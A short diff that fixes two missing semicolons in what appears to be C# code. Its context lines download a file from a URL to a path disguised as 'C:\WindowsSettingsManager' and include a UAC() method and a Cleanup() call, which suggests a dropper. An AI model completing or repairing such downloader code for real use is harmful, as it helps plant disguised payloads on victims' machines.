@@ -11,7 +11,7 @@ namespace Main {
             string savePath = @"C:\WindowsSettingsManager";
             WebClient client = new WebClient();
             client.DownloadFile(url, savePath);
-            client.Dispose()
+            client.Dispose();
         }
 
         public static bool UAC()
@@ -64,7 +64,7 @@ namespace Main {
 
             });
 
-            status = Cleanup()
+            status = Cleanup();
         }
 
     }
